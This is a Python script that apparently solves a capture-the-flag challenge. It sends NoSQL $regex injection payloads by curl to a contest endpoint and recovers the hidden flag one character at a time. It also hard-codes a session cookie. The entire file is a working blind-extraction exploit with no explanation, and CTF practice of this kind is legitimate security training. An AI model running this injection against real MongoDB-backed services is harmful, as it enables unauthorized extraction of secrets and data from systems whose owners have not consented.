import subprocess
testcase = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_{}"
data = '{"_id":"_id:3","challenge_flag":{"$regex": ".*"}}'
flag = 'INTIGRITI{'
while True:
    for i in testcase:
        data = '{"_id":"_id:3","challenge_flag":{"$regex": "' + flag+i + '.*"}}'
        result = subprocess.run(['curl','-s', '-X','POST','https://ctfc.ctf.intigriti.io/submit_flag','-b','session=eyJ1c2VyIjp7Il9pZCI6ImFjNDBiZDkzYzA2YTQ5ZWViOTVkOWIxZWRkNmIzYjRkIiwidXNlcm5hbWUiOiJ0ZXN0MTIzNCJ9fQ.ZVg2YQ.OwxwhpJzlPsuXH9uuTrLEPNZQQo', '-d', data, "-H" ,'Content-Type: application/json'], stdout=subprocess.PIPE)
        if "correct" in result.stdout.decode(): flag = flag+i
    print(flag)
    if flag[-1] == '}': break 
print('The Flag:',flag)
